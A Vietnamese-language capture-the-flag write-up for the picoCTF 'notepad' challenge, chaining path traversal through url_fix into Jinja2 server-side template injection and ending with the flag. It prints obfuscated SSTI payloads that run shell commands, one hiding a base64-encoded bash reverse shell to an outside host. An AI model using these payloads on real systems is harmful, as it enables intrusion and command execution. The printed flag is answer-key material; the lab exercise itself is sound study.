# Overview #
- Points : 100
- Tags : `Web Exploitation`
# Description #
This note-taking site seems a bit off.  https://notepad.mars.picoctf.net/

src: https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/notepad/notepad.tar
# Observe #
![image](https://github.com/Aowpu/CTF/assets/130723782/3a2a539d-fb32-400d-bae1-0a81b6b60bc5)
- Mã trên tạo một ứng dụng Flask cho phép bạn nhập nội dung và tạo ra các trang web tĩnh.
Nó kiểm tra nội dung đã nhập và sau đó tạo một tệp HTML tương ứng để hiển thị nội dung. 

![image](https://github.com/Aowpu/CTF/assets/130723782/65f6f399-7e9d-4921-9916-f6a246f869b7)
- Tệp index.html cho thấy thấy rằng nó sẽ hiện ra lỗi nếu có nên tôi đã thử cho error là 1 thứ gì đó bất kì
![image](https://github.com/Aowpu/CTF/assets/130723782/ab45f4b9-aee2-460f-aa8e-1e05ef4cced5)
![image](https://github.com/Aowpu/CTF/assets/130723782/5fea4dff-f48f-4915-821a-a6d5551bc0d7)
- Trong đoạn code trên có thể thấy nó đã tạo tệp name, tên của tệp là 128 kí tự đầu tiên của nội dung và mã thông báo ngẫu nhiên
- Có một điều rằng chúng ta có thể dựa trên url_fix(content[:128]) cho thấy khi tìm kiếm thì url_fix sẽ biến \ thành / mà ở trong
điều kiện không hề cấm điều này. Chúng ta có thể sử dụng điều này để duyệt qua hệ thống tập tin.
# Attack #
- Mình đã nghĩ đến lỗ hổng SSTI vì kiểm tra dữ liệu đầu vào ở đây không nghiêm ngặt
- Chúng ta có thể tạo mẫu lỗi của riêng mình bằng cách sử dụng kỹ thuật truyền tải đường dẫn để tạo một tệp trong thư templates/errors
  ![image](https://github.com/Aowpu/CTF/assets/130723782/079c3739-77c7-404a-93f5-052175a0da00)
- Sau khi gửi nó đã hiện ra not found bởi vì chúng ta đã ghi vào một tệp bên ngoài thư mục tĩnh nên không thể truy cập bằng /static/...
- Tuy nhiên, chúng ta có thể kiểm tra payload bằng cách chuyển tên tệp vào phần error
  ![image](https://github.com/Aowpu/CTF/assets/130723782/2754cf1e-4b42-4938-9797-780ad7e1056c)
- Payload đã được in lại
- Chúng ta có thể sử dụng SSTI(Sever-side template injection) để truy xuất cờ.
- Tôi đã tìm thấy bài viết trong hacktricks về cách khai thác lỗ hổng SSTI này ở bài Jinja2 SSTI và câu lệnh dùng để injection vào hệ thống
- "{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}"
- Sau khi đọc dòng lệnh trên tôi đã thay đổi 1 số chỗ để phù hợp với bài này, đoạn mã hóa base 64 ở câu lệnh trên tôi sẽ đổi nó bởi vì theo Dockerfile được cung cấp cho thấy tệp chứa cờ nằm trong thư mục gốc của UUID ngẫu nhiên.
Vì vậy chùng ta cần tìm tên file của lá cờ
- Chúng ta sẽ sửa đoạn base 64 thành "ls /app" sau đó mã hóa b64 bởi vì thứ chúng ta muốn echo bây giờ là file của lá cờ trong thư mục app
- Đoạn mã sẽ injection vào là
  " {% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n bHMgL2FwcA== | base64 -d | bash")["read"]() %} {{a}} {% endwith %} "
-  Vì tên tệp nó sẽ lấy 128 kí tự đầu do dùng câu lệnh url_fix(content[:128]) nên chúng ta sẽ chèn sao cho đủ 128 kí tự ở đầu cho đầy để không phần nào của injection được lưu vào tên của file
-  Sau khi gửi câu lệnh
-  ![image](https://github.com/Aowpu/CTF/assets/130723782/0fdd859f-12cc-41d9-b981-6eeaecfadcf7)
- Nó đã trả về tên tệp trên thanh tìm kiếm
- Thực hiện các bước chèn tên tệp vào sau error chúng ta đã tìm file chứa flag
     ![image](https://github.com/Aowpu/CTF/assets/130723782/af0cb711-02ec-47e7-a3ea-5cf0041a28b7)
- Sau đó chúng ta cat file đó ra bằng cách lại thay đoạn mã hóa base 64 trong câu lệnh injection trên bằng câu lệnh "cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt"
  và rồi thực hiện lại các bước trên để hiện ra flag
![image](https://github.com/Aowpu/CTF/assets/130723782/a7f7176d-a611-40da-ba31-2d1dcb7fbf91)
# Flag: picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n} #
